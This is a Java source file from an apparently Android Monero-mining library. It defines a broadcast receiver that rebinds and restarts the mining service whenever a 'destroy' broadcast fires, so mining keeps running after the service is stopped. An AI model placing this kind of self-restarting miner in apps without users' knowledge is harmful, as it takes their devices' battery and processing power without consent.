package waterhole.miner.monero;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;

public final class MineReceiver extends BroadcastReceiver {

    private IMiningServiceBinder.MiningServiceBinder mServiceBinder;

    private final ServiceConnection mServerConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            mServiceBinder = (IMiningServiceBinder.MiningServiceBinder) IMiningServiceBinder.MiningServiceBinder.asInterface(iBinder);
            mServiceBinder.setControllerNeedRun(true);
            mServiceBinder.startMine();
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            mServiceBinder = null;
        }
    };

    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction() != null && intent.getAction().equals("waterhole.miner.monero.destroy")){
            Intent intentService = new Intent(context, MineService.class);
            context.bindService(intentService, mServerConnection, Context.BIND_AUTO_CREATE);
            context.startService(intentService);
        }
    }
}
